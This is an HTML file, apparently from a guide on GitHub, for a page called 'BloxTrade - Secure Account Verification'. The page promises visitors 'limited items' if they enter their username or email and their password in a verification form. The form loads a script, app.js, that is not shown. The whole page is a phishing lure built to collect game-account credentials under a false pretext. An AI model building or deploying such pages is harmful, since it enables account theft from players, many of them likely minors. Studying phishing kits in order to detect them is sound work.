<!-- Excerpt from V4por's GitHub Guide: index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BloxTrade - Secure Account Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="auth-card">
        <div class="logo-header">
            <h2>Verify Your Account</h2>
            <p>Connect your account to claim your limited items.</p>
        </div>
        <form id="auth-form">
            <div class="input-group">
                <label>Username / Email</label>
                <input type="text" id="username" placeholder="Enter username..." required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Enter password..." required>
            </div>
            <button type="submit" id="submit-btn">Continue Verification</button>
        </form>
    </div>
    <script src="app.js"></script>
</body>
</html>
